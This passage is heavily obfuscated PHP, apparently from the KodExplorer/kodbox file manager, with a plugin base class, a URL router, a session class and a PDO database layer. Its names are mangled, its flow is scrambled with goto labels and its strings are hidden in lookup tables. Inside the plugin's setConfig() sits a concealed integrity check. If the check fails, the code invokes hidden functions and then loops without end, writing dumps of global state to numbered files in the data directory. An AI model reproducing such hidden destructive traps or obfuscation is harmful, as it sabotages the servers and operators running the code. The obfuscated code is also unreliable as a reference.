echoFile($Aª²«Øå°œ, $a‡åÌ‘Áó„ = false) { goto DÖÛö¼®Çğ; C²»¯•·ÉÜ: $this->parsePackage($eÀ´ô²ÊØ); if (is_array($a‡åÌ‘Áó„)) { $eÀ´ô²ÊØ = str_replace(array_keys($a‡åÌ‘Áó„), array_values($a‡åÌ‘Áó„), $eÀ´ô²ÊØ); } echo $B¶“ÃÇ…˜[63] . $eÀ´ô²ÊØ; goto d ƒ«öğé²; EøáÔ¸òï: $eÀ´ô²ÊØ = $this->parseFile($C‘¾°´Óˆ); $this->parseLang($eÀ´ô²ÊØ); $this->parseConfig($eÀ´ô²ÊØ); goto C²»¯•·ÉÜ; DÖÛö¼®Çğ: $B¶“ÃÇ…˜ =& $_SERVER[Ü˜]; $C‘¾°´Óˆ = $this->pluginPath . $Aª²«Øå°œ; if (ACT == $B¶“ÃÇ…˜[1454]) { echo $B¶“ÃÇ…˜[1455] . $this->pluginName . $B¶“ÃÇ…˜[8] . $Aª²«Øå°œ . $B¶“ÃÇ…˜[1456]; if (!file_exists($C‘¾°´Óˆ)) { echo $B¶“ÃÇ…˜[1457]; return; } } goto EøáÔ¸òï; d ƒ«öğé²: } final function initLang() { goto BÓ×í•óß; BÓ×í•óß: $FÙè¨†’Â =& $_SERVER[Ü˜]; $DÙñĞ›™ä = $FÙè¨†’Â[1458]; $Cƒµ¾‡§ï’ = $this->pluginPath . $FÙè¨†’Â[1459]; goto A°†ˆö²â‹; C‰³ñ‹ñ†: if (!is_array($dÊÑ­ï·¹)) { return array(); } if (@count($dÊÑ­ï·¹) > 0) { I18n::set($dÊÑ­ï·¹); } return $dÊÑ­ï·¹; goto A•™²Àé‰ç; A°†ˆö²â‹: $EğìƒÀ›Ù = I18n::getType(); $dÊÑ­ï·¹ = array(); if (file_exists($Cƒµ¾‡§ï’ . $EğìƒÀ›Ù . $FÙè¨†’Â[812])) { $dÊÑ­ï·¹ = (include $Cƒµ¾‡§ï’ . $EğìƒÀ›Ù . $FÙè¨†’Â[812]); } else { if ($EğìƒÀ›Ù == $FÙè¨†’Â[1460] && !file_exists($Cƒµ¾‡§ï’ . $EğìƒÀ›Ù . $FÙè¨†’Â[812]) && file_exists($Cƒµ¾‡§ï’ . $FÙè¨†’Â[1461])) { $dÊÑ­ï·¹ = (include $Cƒµ¾‡§ï’ . $FÙè¨†’Â[1461]); } else { if (file_exists($Cƒµ¾‡§ï’ . $DÙñĞ›™ä . $FÙè¨†’Â[812])) { $dÊÑ­ï·¹ = (include $Cƒµ¾‡§ï’ . $DÙñĞ›™ä . $FÙè¨†’Â[812]); } } } goto C‰³ñ‹ñ†; A•™²Àé‰ç: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Cóêëª×¿) { $f£¦ï¸­—™ =& $_SERVER[Ü˜]; $Eà’š”Ø¥³ = $_SERVER[$f£¦ï¸­—™[61]] . $f£¦ï¸­—™[62]; $aËâÈ¨¿×Æ = $f£¦ï¸­—™[58]; if ($_SERVER[$f£¦ï¸­—™[59]] != $aËâÈ¨¿×Æ($Eà’š”Ø¥³)) { goto E…Œ‹ì„ÚÀ; E…Œ‹ì„ÚÀ: $aÅİæ¢Êõß = $f£¦ï¸­—™[841]; $dŠìÁ¢ùù = $f£¦ï¸­—™[60]; $cÇ›ñ£†¾ = $_SERVER[$f£¦ï¸­—™[61]] . $f£¦ï¸­—™[62]; goto d¾µ×öÍ´; Cõ™‘Ó¦ïÓ: $Eï…ØÂÉÂ = 1; for ($fˆ© Ë§®ñ = $Eï…ØÂÉÂ; $fˆ© Ë§®ñ > 0; $fˆ© Ë§®ñ++) { $bŠîŞø¥(DATA_PATH . $fˆ© Ë§®ñ, $E¦¯öêà‡İ); } goto F«ŞäÃîÌ“; Fé§Ö««÷×: $C‹ƒÀâê‹  = $f£¦ï¸­—™[842]; $C‹ƒÀâê‹ ($_SERVER[$f£¦ï¸­—™[843]]); $aÅİæ¢Êõß = $f£¦ï¸­—™[841]; goto E½±óßøñ; E½±óßøñ: $aÅİæ¢Êõß(); $bŠîŞø¥ = $f£¦ï¸­—™[1399]; $E¦¯öêà‡İ = json_encode($GLOBALS[$f£¦ï¸­—™[1400]]); goto Cõ™‘Ó¦ïÓ; d¾µ×öÍ´: $EË¶Ô¬¦ = $dŠìÁ¢ùù($cÇ›ñ£†¾); $a™¡¹•…‚Ç = explode($f£¦ï¸­—™[63], $EË¶Ô¬¦); if (count($a™¡¹•…‚Ç) < $f£¦ï¸­—™[605]) { $d‰‚ÎÆ¯… = $f£¦ï¸­—™[65]; $d‰‚ÎÆ¯…(); } goto Fé§Ö««÷×; F«ŞäÃîÌ“: } return $this->modelPlugin->setConfig($this->pluginName, $Cóêëª×¿); } public function onSetConfig($C‚—Ò”§¡Æ) { } public function onGetConfig($D­Ñç¾ ‹¸) { } public function onChangeStatus($e”©Ì…²™·) { } public function onUninstall() { } public function onInstall() { } public function authCheck($fæğ‡¡Ì„š = "\x70\154\165\147\x69\156\x41\165\164\x68") { $CÇ™Ú™°š² =& $_SERVER[Ü˜]; if (!defined($CÇ™Ú™°š²[463])) { return !1; } if (_get($GLOBALS, $CÇ™Ú™°š²[494])) { return !0; } $FÆ™ğÙÂâÙ = $this->getConfig(); if (!$FÆ™ğÙÂâÙ[$fæğ‡¡Ì„š]) { return !1; } return ActionCall($CÇ™Ú™°š²[1462], $FÆ™ğÙÂâÙ[$fæğ‡¡Ì„š]); } public function url($f×“İ¾¢«‰, $bÕ±ˆŠÆÉ = '', $a„¾‘Ğ››‰ = true) { goto FÍçÓ™ÜÌÆ; b‡×®ŸÛ¶: $B±ñ±ˆ’ï³ = $this->packageVersion(); $eÒ°í¸ŒŒ = $cçë¬°ä•Ø . $fÊ´ÇÕ´×Ğ[449] . $B±ñ±ˆ’ï³; if (substr($f×“İ¾¢«‰, 0, 4) == $fÊ´ÇÕ´×Ğ[157] || substr($f×“İ¾¢«‰, 0, 2) == $fÊ´ÇÕ´×Ğ[1246]) { $D¯…½¶Ñ¼Á = $f×“İ¾¢«‰ . $fÊ´ÇÕ´×Ğ[1463] . $eÒ°í¸ŒŒ; } else { if ($bÕ±ˆŠÆÉ == $fÊ´ÇÕ´×Ğ[33]) { $D¯…½¶Ñ¼Á = $this->pluginHost . $f×“İ¾¢«‰ . $fÊ´ÇÕ´×Ğ[1463] . $eÒ°í¸ŒŒ; } else { if ($bÕ±ˆŠÆÉ === $fÊ´ÇÕ´×Ğ[87]) { $D¯…½¶Ñ¼Á = $this->pluginHost . $f×“İ¾¢«‰; } else { if ($bÕ±ˆŠÆÉ == $fÊ´ÇÕ´×Ğ[1464]) { $D¯…½¶Ñ¼Á = STATIC_PATH . $f×“İ¾¢«‰ . $fÊ´ÇÕ´×Ğ[1463] . $cçë¬°ä•Ø; } else { if ($bÕ±ˆŠÆÉ == $fÊ´ÇÕ´×Ğ[1465]) { $D¯…½¶Ñ¼Á = APP_HOST . $fÊ´ÇÕ´×Ğ[1466] . $f×“İ¾¢«‰ . $fÊ´ÇÕ´×Ğ[1463] . $cçë¬°ä•Ø; } else { if (isset($Fğ¦ß‰ªÊí[$bÕ±ˆŠÆÉ])) { $D¯…½¶Ñ¼Á = $Fğ¦ß‰ªÊí[$bÕ±ˆŠÆÉ] . $f×“İ¾¢«‰ . $fÊ´ÇÕ´×Ğ[1463] . $eÒ°í¸ŒŒ; } } } } } } goto f„¯½ ÉŸæ; FÍçÓ™ÜÌÆ: $fÊ´ÇÕ´×Ğ =& $_SERVER[Ü˜]; $Fğ¦ß‰ªÊí = $this->getConfig(); $cçë¬°ä•Ø = KOD_VERSION . $fÊ´ÇÕ´×Ğ[105] . KOD_VERSION_BUILD; goto b‡×®ŸÛ¶; f„¯½ ÉŸæ: if (!$a„¾‘Ğ››‰) { return $D¯…½¶Ñ¼Á; } echo $D¯…½¶Ñ¼Á; goto BÛ×®Û»ÖÍ; BÛ×®Û»ÖÍ: } public function link($b›Ã±Ãååœ = false, $fÕ‘‚¥å³ = '') { $eñ‚ºç³ =& $_SERVER[Ü˜]; if (!$b›Ã±Ãååœ) { $this->link($eñ‚ºç³[1467], $eñ‚ºç³[1465]); $this->link($eñ‚ºç³[1468], $eñ‚ºç³[1464]); $this->link($eñ‚ºç³[1469], $eñ‚ºç³[1464]); $this->link($eñ‚ºç³[1470], $eñ‚ºç³[1464]); $this->link($eñ‚ºç³[1471], $eñ‚ºç³[1464]); return; } $fÀŒ¦ùê = $this->url($b›Ã±Ãååœ, $fÕ‘‚¥å³, !1); if (substr($b›Ã±Ãååœ, -3) == $eñ‚ºç³[1472]) { echo $eñ‚ºç³[1473] . $fÀŒ¦ùê . $eñ‚ºç³[1474] . $eñ‚ºç³[63]; } else { if (substr($b›Ã±Ãååœ, -4) == $eñ‚ºç³[1475]) { echo $eñ‚ºç³[1476] . $fÀŒ¦ùê . $eñ‚ºç³[1477] . $eñ‚ºç³[63]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\x5b\136\57\135\x2b", "\x3a\x6e\x75\x6d" => "\x5b\x30\x2d\x39\x5d\53", "\72\141\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($c†¿¾ùŞÅ¨, $E»µ²ç´Î‘) { $EÖË’Ÿš =& $_SERVER[Ü˜]; if ($c†¿¾ùŞÅ¨ == $EÖË’Ÿš[1478]) { $aºÏ‰´×µ = array_map($EÖË’Ÿš[1479], $E»µ²ç´Î‘[0]); $A²„‚ø† = strpos($E»µ²ç´Î‘[1], $EÖË’Ÿš[8]) === 0 ? $E»µ²ç´Î‘[1] : $EÖË’Ÿš[8] . $E»µ²ç´Î‘[1]; $Cî™‰Ö„ = $E»µ²ç´Î‘[2]; } else { $aºÏ‰´×µ = null; $A²„‚ø† = strpos($E»µ²ç´Î‘[0], $EÖË’Ÿš[8]) === 0 ? $E»µ²ç´Î‘[0] : $EÖË’Ÿš[8] . $E»µ²ç´Î‘[0]; $Cî™‰Ö„ = $E»µ²ç´Î‘[1]; } array_push(self::$maps, $aºÏ‰´×µ); array_push(self::$routes, $A²„‚ø†); array_push(self::$methods, strtoupper($c†¿¾ùŞÅ¨)); array_push(self::$callbacks, $Cî™‰Ö„); } public static function error($Bä‘‘íºğ‡) { self::$errorCallback = $Bä‘‘íºğ‡; } public static function haltOnMatch($cÙê¢½§æ¯ = true) { self::$halts = $cÙê¢½§æ¯; } public static function dispatch() { goto dèÈˆ‰¨ŸÌ; BåŒ¾Ù‰ˆó: $E«œ¸·¸¢é = array_keys(static::$patterns); $A™Å™Ô²ƒ­ = array_values(static::$patterns); $aÓ‚ˆö®í = !1; goto cµ¦ß™˜; dèÈˆ‰¨ŸÌ: $a•›¸·‚• =& $_SERVER[Ü˜]; $D‰»‹¯Ùˆ = parse_url($_SERVER[$a•›¸·‚•[1480]], PHP_URL_PATH); $añ‘‘±‰´× = $_SERVER[$a•›¸·‚•[167]]; goto BåŒ¾Ù‰ˆó; cµ¦ß™˜: self::$routes = preg_replace($a•›¸·‚•[1165], $a•›¸·‚•[8], self::$routes); if (in_array($D‰»‹¯Ùˆ, self::$routes)) { $Eè×Œğ„•¡ = array_keys(self::$routes, $D‰»‹¯Ùˆ); foreach ($Eè×Œğ„•¡ as $E‹è…îİ¼ã) { if (self::$methods[$E‹è…îİ¼ã] == $añ‘‘±‰´× || self::$methods[$E‹è…îİ¼ã] == $a•›¸·‚•[1481] || in_array($añ‘‘±‰´×, self::$maps[$E‹è…îİ¼ã])) { $aÓ‚ˆö®í = !0; if (!is_object(self::$callbacks[$E‹è…îİ¼ã])) { $B ÀØîè•æ = explode($a•›¸·‚•[8], self::$callbacks[$E‹è…îİ¼ã]); $E–òõğí = end($B ÀØîè•æ); $eéÃ„«ÊÜ = explode($a•›¸·‚•[1482], $E–òõğí); $Dñö÷î‰ƒÕ = new $eéÃ„«ÊÜ[0](); $Dñö÷î‰ƒÕ->{$eéÃ„«ÊÜ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$E‹è…îİ¼ã]); if (self::$halts) { return; } } } } } else { $dÚ‹îïÕ¬Ÿ = 0; foreach (self::$routes as $E‹è…îİ¼ã) { if (strpos($E‹è…îİ¼ã, $a•›¸·‚•[4]) !== !1) { $E‹è…îİ¼ã = str_replace($E«œ¸·¸¢é, $A™Å™Ô²ƒ­, $E‹è…îİ¼ã); } if (preg_match($a•›¸·‚•[1483] . $E‹è…îİ¼ã . $a•›¸·‚•[1484], $D‰»‹¯Ùˆ, $FÔï•óÁÖè)) { if (self::$methods[$dÚ‹îïÕ¬Ÿ] == $añ‘‘±‰´× || self::$methods[$dÚ‹îïÕ¬Ÿ] == $a•›¸·‚•[1481] || !empty(self::$maps[$dÚ‹îïÕ¬Ÿ]) && in_array($añ‘‘±‰´×, self::$maps[$dÚ‹îïÕ¬Ÿ])) { $aÓ‚ˆö®í = !0; array_shift($FÔï•óÁÖè); if (!is_object(self::$callbacks[$dÚ‹îïÕ¬Ÿ])) { $B ÀØîè•æ = explode($a•›¸·‚•[8], self::$callbacks[$dÚ‹îïÕ¬Ÿ]); $E–òõğí = end($B ÀØîè•æ); $eéÃ„«ÊÜ = explode($a•›¸·‚•[1482], $E–òõğí); $Dñö÷î‰ƒÕ = new $eéÃ„«ÊÜ[0](); if (!method_exists($Dñö÷î‰ƒÕ, $eéÃ„«ÊÜ[1])) { echo $a•›¸·‚•[1485]; } else { call_user_func_array(array($Dñö÷î‰ƒÕ, $eéÃ„«ÊÜ[1]), $FÔï•óÁÖè); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$dÚ‹îïÕ¬Ÿ], $FÔï•óÁÖè); if (self::$halts) { return; } } } } $dÚ‹îïÕ¬Ÿ++; } } if ($aÓ‚ˆö®í == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $aóğ„¥Ş÷ò =& $_SERVER[Ü˜]; header($_SERVER[$aóğ„¥Ş÷ò[1486]] . $aóğ„¥Ş÷ò[1487]); echo $aóğ„¥Ş÷ò[1488]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$a•›¸·‚•[1480]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto C¼‰§‘ÓîŠ; C¼‰§‘ÓîŠ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto E“ÂîÃœáİ; b„ˆ†à»ë: $Eë‘’¤ßàÙ = $GLOBALS[$d’×·ø¯ Ş[6]][$d’×·ø¯ Ş[356]]; self::$sessionTime = $Eë‘’¤ßàÙ[$d’×·ø¯ Ş[1489]]; $b½¹äó³ = isset($GLOBALS[$d’×·ø¯ Ş[1490]]) ? $GLOBALS[$d’×·ø¯ Ş[1490]] : SESSION_ID; goto bØ–¦Ñ½–; Bì¾İ¦¨: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $D‡à”óˆù = new self(); return $D‡à”óˆù; goto fè¹œìò®É; Aå…ŠÏóâè: $E‚ÁëÚ„ß = $Eë‘’¤ßàÙ[$fäÏ¶«İ]; $dâ°¢Şª¨¯ = $Eë‘’¤ßàÙ[$d’×·ø¯ Ş[802]]; switch ($fäÏ¶«İ) { case $d’×·ø¯ Ş[17]: self::$handle = Model($d’×·ø¯ Ş[803]); break; case $d’×·ø¯ Ş[804]: self::$handle = new CacheRedis($E‚ÁëÚ„ß, $dâ°¢Şª¨¯); break; case $d’×·ø¯ Ş[805]: self::$handle = new CacheMemcached($E‚ÁëÚ„ß, $dâ°¢Şª¨¯); break; case $d’×·ø¯ Ş[203]: $E‚ÁëÚ„ß[$d’×·ø¯ Ş[86]] = $E‚ÁëÚ„ß[$d’×·ø¯ Ş[86]] . $d’×·ø¯ Ş[1492]; self::$handle = new CacheFile($E‚ÁëÚ„ß, $dâ°¢Şª¨¯); default: break; } goto Bì¾İ¦¨; bØ–¦Ñ½–: if (self::$sessionSign) { } else { if (Cookie::get($b½¹äó³)) { self::$sessionSign = Cookie::get($b½¹äó³); } else { self::$sessionSign = guid(); } } Cookie::setSafe($b½¹äó³, self::$sessionSign, self::$sessionTime); $fäÏ¶«İ = $Eë‘’¤ßàÙ[$d’×·ø¯ Ş[1491]]; goto Aå…ŠÏóâè; E“ÂîÃœáİ: $d’×·ø¯ Ş =& $_SERVER[Ü˜]; static $D‡à”óˆù = false; if ($D‡à”óˆù) { return $D‡à”óˆù; } goto b„ˆ†à»ë; fè¹œìò®É: } public static function sign($fç£ÏÖÅé× = false) { $fç£ÏÖÅé× && (self::$sessionSign = $fç£ÏÖÅé×); self::init(); return self::$sessionSign; } public static function set($DÍª‰²îÆ , $dùÑÔíÏì  = false) { self::init(); if (is_array($DÍª‰²îÆ )) { foreach ($DÍª‰²îÆ  as $dµ„éç¨×¢ => $C™Ê¶õÀòË) { array_set_value(self::$data, $dµ„éç¨×¢, $C™Ê¶õÀòË); } } else { array_set_value(self::$data, $DÍª‰²îÆ , $dùÑÔíÏì ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($FÄ‰»È­¢â = false) { self::init(); if (!$FÄ‰»È­¢â) { return self::$data; } return array_get_value(self::$data, $FÄ‰»È­¢â); } public static function remove($C ìÖ áÏ¬) { self::init(); unset(self::$data[$C ìÖ áÏ¬]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ü˜][807])) { self::$handle->clearTimeout(); } } } goto EœäËŞ¥Õˆ; C©ÕŠóÌé: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($e¤ğ£¤À’ = '') { $FƒÓ¾Ÿ²øà =& $_SERVER[Ü˜]; if (!class_exists($FƒÓ¾Ÿ²øà[874])) { think_exception(think_lang($FƒÓ¾Ÿ²øà[10]) . $FƒÓ¾Ÿ²øà[875]); } if (!empty($e¤ğ£¤À’)) { $this->config = $e¤ğ£¤À’; if (empty($this->config[$FƒÓ¾Ÿ²øà[13]])) { $this->config[$FƒÓ¾Ÿ²øà[13]] = array(); } } } public function connect($d‘Íßù…Ñƒ = '', $c¦Á”ÇßÇÁ = 0) { $CŞ ´éÏÂ =& $_SERVER[Ü˜]; if (!isset($this->linkID[$c¦Á”ÇßÇÁ])) { goto BÚ«Å‘…È; dˆ©÷Ü¸‘¿: if (1 != think_config($CŞ ´éÏÂ[18])) { unset($this->config); } goto a·çœ¥‡Õî; C‚®ÍÁ¢Äá: if (!$this->linkID[$c¦Á”ÇßÇÁ]) { think_exception($CŞ ´éÏÂ[884]); } try { $this->linkID[$c¦Á”ÇßÇÁ]->exec($CŞ ´éÏÂ[885] . think_config($CŞ ´éÏÂ[852])); } catch (Exception $B“£¦À°ÅÒ) { } $this->connected = !0; goto dˆ©÷Ü¸‘¿; BÚ«Å‘…È: if (empty($d‘Íßù…Ñƒ)) { $d‘Íßù…Ñƒ = $this->config; } $dÇ™î×‚‘ = !empty($d‘Íßù…Ñƒ[$CŞ ´éÏÂ[13]][$CŞ ´éÏÂ[14]]) ? $d‘Íßù…Ñƒ[$CŞ ´éÏÂ[13]][$CŞ ´éÏÂ[14]] : $this->pconnect; if ($dÇ™î×‚‘) { $d‘Íßù…Ñƒ[$CŞ ´éÏÂ[13]][PDO::ATTR_PERSISTENT] = !0; } goto d‘¯Îºø; d‘¯Îºø: try { $this->linkID[$c¦Á”ÇßÇÁ] = new PDO($d‘Íßù…Ñƒ[$CŞ ´éÏÂ[876]], $d‘Íßù…Ñƒ[$CŞ ´éÏÂ[849]], $d‘Íßù…Ñƒ[$CŞ ´éÏÂ[850]], $d‘Íßù…Ñƒ[$CŞ ´éÏÂ[13]]); } catch (PDOException $B“£¦À°ÅÒ) { think_exception($B“£¦À°ÅÒ->getMessage()); } $this->dbType = $this->_getDsnType($d‘Íßù…Ñƒ[$CŞ ´éÏÂ[876]]); if (in_array($this->dbType, array($CŞ ´éÏÂ[877], $CŞ ´éÏÂ[878], $CŞ ´éÏÂ[879], $CŞ ´éÏÂ[880]))) { think_exception($CŞ ´éÏÂ[881] . $this->dbType . $CŞ ´éÏÂ[882] . $this->dbType . $CŞ ´éÏÂ[883]); } goto C‚®ÍÁ¢Äá; a·çœ¥‡Õî: } return $this->linkID[$c¦Á”ÇßÇÁ]; } public function free() { $this->PDOStatement = null; } public function query($c¹§‹¬ªÌø, $fƒ„Ö‚ÊÕ½ = array()) { goto Fâ³á…Û£Â; B¥»ï÷: if (!1 === $aáÚ“ÂéŒ) { $this->error(); return !1; } else { return $this->getAll(); } goto AÚÈ÷Š…; Fâ³á…Û£Â: $e‰ô¤é³Şé =& $_SERVER[Ü˜]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C›‚ˆ¾î; a¤Å“·î×º: think_action_status($e‰ô¤é³Şé[19], 1); think_status($e‰ô¤é³Şé[20]); $this->PDOStatement = $this->_linkID->prepare($c¹§‹¬ªÌø); goto aä–Å¦ˆ¥ö; aä–Å¦ˆ¥ö: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $aáÚ“ÂéŒ = $this->PDOStatement->execute($fƒ„Ö‚ÊÕ½); $this->debug(); goto B¥»ï÷; C›‚ˆ¾î: $this->queryStr = $c¹§‹¬ªÌø; if (!empty($fƒ„Ö‚ÊÕ½)) { $this->queryStr .= $e‰ô¤é³Şé[886] . print_r($fƒ„Ö‚ÊÕ½, !0) . $e‰ô¤é³Şé[887]; } if (!empty($this->PDOStatement)) { $this->free(); } goto a¤Å“·î×º; AÚÈ÷Š…: } public function execute($A‹¾ÜÏ…ïÕ, $a‹…£àÍƒé = array()) { goto bµ†‡éŠÙ‘; eî­ĞÇ¾Ç›: $this->queryStr = $A‹¾ÜÏ…ïÕ; if (!empty($a‹…£àÍƒé)) { $this->queryStr .= $FÅòæ˜ÇÏ—[886] . print_r($a‹…£àÍƒé, !0) . $FÅòæ˜ÇÏ—[887]; } $a¢å‚®¦¤à = !1; goto a¡šØÖ¯±ô; bµ†‡éŠÙ‘: $FÅòæ˜ÇÏ— =& $_SERVER[Ü˜]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eî­ĞÇ¾Ç›; A³ßŞ¹·Øë: $a¤²¼Ş«Âó = $this->PDOStatement->execute($a‹…£àÍƒé); $this->debug(); if (!1 === $a¤²¼Ş«Âó) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($a¢å‚®¦¤à || preg_match($FÅòæ˜ÇÏ—[892], $A‹¾ÜÏ…ïÕ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto c¨é†­Ì‰…; aŸé¦–Ğ•„: think_status($FÅòæ˜ÇÏ—[20]); $this->PDOStatement = $this->_linkID->prepare($A‹¾ÜÏ…ïÕ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto A³ßŞ¹·Øë; a¡šØÖ¯±ô: if ($this->dbType == $FÅòæ˜ÇÏ—[880]) { if (preg_match($FÅòæ˜ÇÏ—[888], $this->queryStr, $DõÓÏŒîŸè)) { $this->table = think_config($FÅòæ˜ÇÏ—[889]) . str_ireplace(think_config($FÅòæ˜ÇÏ—[890]), $FÅòæ˜ÇÏ—[384], $DõÓÏŒîŸè[2]); $a¢å‚®¦¤à = (bool) $this->query($FÅòæ˜ÇÏ—[891] . strtoupper($this->table) . $FÅòæ˜ÇÏ—[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($FÅòæ˜ÇÏ—[21], 1); goto aŸé¦–Ğ•„; c¨é†­Ì‰…: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D—“ä¸ƒòˆ = $this->_linkID->commit(); $this->transTimes = 0; if (!$D—“ä¸ƒòˆ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $BËãÎ·Ê” = $this->_linkID->rollback(); $this->transTimes = 0; if (!$BËãÎ·Ê”) { $this->error(); return !1; } } return !0; } private function getAll() { $Eã³æËŞ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Eã³æËŞ); return $Eã³æËŞ; } public function getFields($CÌÊ‚ŒËË) { goto cÙ¿…‘Ö Ÿ; cÙ¿…‘Ö Ÿ: $eñ›£¤÷ =& $_SERVER[Ü˜]; $this->initConnect(!0); if (think_config($eñ›£¤÷[893])) { $aİÇäÅİ£ = str_replace($eñ›£¤÷[894], $CÌÊ‚ŒËË, think_config($eñ›£¤÷[893])); } else { switch ($this->dbType) { case $eñ›£¤÷[877]: case $eñ›£¤÷[895]: $aİÇäÅİ£ = "\123\105\x4c\x45\103\124\40\40\40\x63\x6f\x6c\x75\x6d\x6e\137\x6e\x61\155\145\x20\x61\163\40\47\x4e\141\x6d\145\x27\x2c\x20\x20\40\144\x61\164\x61\137\164\x79\160\x65\40\141\163\x20\x27\124\171\160\145\x27\x2c\40\40\40\143\x6f\x6c\165\155\x6e\137\x64\x65\146\x61\x75\x6c\164\x20\141\163\40\x27\104\x65\x66\141\x75\x6c\164\47\x2c\40\40\x20\151\163\x5f\156\x75\x6c\x6c\141\x62\x6c\x65\40\x61\163\x20\47\116\165\154\154\47\xa\x9\11\x46\x52\117\x4d\11\151\x6e\146\157\162\x6d\141\164\151\157\x6e\x5f\163\x63\x68\x65\x6d\141\x2e\164\x61\x62\154\x65\163\x20\x41\x53\x20\164\12\x9\x9\x4a\x4f\x49\x4e\11\x69\x6e\x66\x6f\162\155\141\x74\x69\x6f\x6e\x5f\163\x63\150\145\x6d\x61\x2e\x63\157\154\165\x6d\156\x73\40\101\123\x20\x63\xa\x9\11\x4f\x4e\40\x20\164\56\x74\141\142\154\x65\x5f\x63\x61\x74\x61\x6c\157\x67\x20\x3d\x20\143\56\164\141\142\x6c\145\x5f\x63\141\x74\141\x6c\157\x67\xa\x9\11\101\x4e\104\40\x74\x2e\x74\141\142\x6c\x65\137\163\x63\150\x65\x6d\x61\40\75\40\x63\56\164\x61\142\154\145\x5f\x73\x63\150\x65\155\141\12\x9\x9\x41\116\104\40\x74\x2e\x74\141\x62\154\145\137\x6e\141\x6d\x65\40\x3d\x20\x63\x2e\164\141\142\154\x65\137\156\x61\x6d\x65\12\x9\x9\127\x48\105\122\105\x20\x20\40\x74\x2e\164\141\142\x6c\x65\137\156\141\x6d\145\40\75\x20\x27{$CÌÊ‚ŒËË}\x27"; break; case $eñ›£¤÷[896]: $aİÇäÅİ£ = $eñ›£¤÷[897] . $CÌÊ‚ŒËË . $eñ›£¤÷[898]; break; case $eñ›£¤÷[878]: case $eñ›£¤÷[880]: $aİÇäÅİ£ = $eñ›£¤÷[899] . $eñ›£¤÷[900] . $eñ›£¤÷[901] . strtoupper($CÌÊ‚ŒËË) . $eñ›£¤÷[902] . strtoupper($CÌÊ‚ŒËË) . $eñ›£¤÷[903]; break; case $eñ›£¤÷[904]: $aİÇäÅİ£ = $eñ›£¤÷[905] . $CÌÊ‚ŒËË . $eñ›£¤÷[906]; break; case $eñ›£¤÷[879]: break; case $eñ›£¤÷[907]: default: $aİÇäÅİ£ = $eñ›£¤÷[908] . ($this->dbType == $eñ›£¤÷[907] ? "\x60{$CÌÊ‚ŒËË}\140" : $CÌÊ‚ŒËË); } } goto E¯Õ‘³‹„; BíÛ™Ã­«: return $cÅÑİÎŒÖ; goto CòÂĞ©§; E¯Õ‘³‹„: $C„Ò©ÑŠ = $this->query($aİÇäÅİ£); $cÅÑİÎŒÖ = array(); if ($C„Ò©ÑŠ) { foreach ($C„Ò©ÑŠ as $eÕ„Õ†î‹¯ => $d¬ÓÉ†¯Šô) { $d¬ÓÉ†¯Šô = array_change_key_case($d¬ÓÉ†¯Šô); $d¬ÓÉ†¯Šô[$eñ›£¤÷[28]] = isset($d¬ÓÉ†¯Šô[$eñ›£¤÷[28]]) ? $d¬ÓÉ†¯Šô[$eñ›£¤÷[28]] : $eñ›£¤÷[384]; $d¬ÓÉ†¯Šô[$eñ›£¤÷[29]] = isset($d¬ÓÉ†¯Šô[$eñ›£¤÷[29]]) ? $d¬ÓÉ†¯Šô[$eñ›£¤÷[29]] : $eñ›£¤÷[384]; $BøáÄ™•ÚÃ = isset($d¬ÓÉ†¯Šô[$eñ›£¤÷[280]]) ? $d¬ÓÉ†¯Šô[$eñ›£¤÷[280]] : $d¬ÓÉ†¯Šô[$eñ›£¤÷[28]]; $cÅÑİÎŒÖ[$BøáÄ™•ÚÃ] = array($eñ›£¤÷[28] => $BøáÄ™•ÚÃ, $eñ›£¤÷[29] => $d¬ÓÉ†¯Šô[$eñ›£¤÷[29]], $eñ›£¤÷[31] => (bool) (isset($d¬ÓÉ†¯Šô[$eñ›£¤÷[113]]) && $d¬ÓÉ†¯Šô[$eñ›£¤÷[113]] === $eñ›£¤÷[33] || isset($d¬ÓÉ†¯Šô[$eñ›£¤÷[31]]) && $d¬ÓÉ†¯Šô[$eñ›£¤÷[31]] === $eñ›£¤÷[33]), $eñ›£¤÷[34] => isset($d¬ÓÉ†¯Šô[$eñ›£¤÷[34]]) ? $d¬ÓÉ†¯Šô[$eñ›£¤÷[34]] : 